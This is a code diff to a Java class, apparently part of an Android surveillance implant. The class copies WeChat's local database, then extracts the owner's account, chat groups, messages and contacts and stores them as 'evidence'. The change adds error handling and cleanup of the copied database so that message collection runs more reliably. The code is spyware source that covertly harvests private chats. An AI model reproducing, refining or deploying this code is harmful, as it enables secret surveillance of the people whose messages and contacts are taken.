@@ -150,20 +150,29 @@ public class ChatWeChat extends SubModuleChat {
 					Check.log(TAG + " (readChatMessages): can read DB");
 				}
 
+				long newLastLine = 0;
 				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-				helper.deleteAtEnd = false;
-
-				setMyAccount(helper);
-				ChatGroups groups = getChatGroups(helper);
-
-				// Save contacts if AddressBook is active
-				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
-					saveWechatContacts(helper);
+				if (helper == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readChatMessages) cannot open db");
+					}
+					return;
 				}
 
-				long newLastLine = fetchMessages(helper, groups, lastLine);
+				try {
 
-				helper.deleteDb();
+					setMyAccount(helper);
+					ChatGroups groups = getChatGroups(helper);
+
+					// Save contacts if AddressBook is active
+					if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
+						saveWechatContacts(helper);
+					}
+
+					newLastLine = fetchMessages(helper, groups, lastLine);
+				}finally {
+					helper.disposeDb();
+				}
 
 				if (newLastLine > lastLine) {
 					if (Cfg.DEBUG) {
@@ -256,7 +265,7 @@ public class ChatWeChat extends SubModuleChat {
 				return createTime;
 			}
 		};
-		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor, true);
+		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);
 
 		getModule().saveEvidence(messages);
 
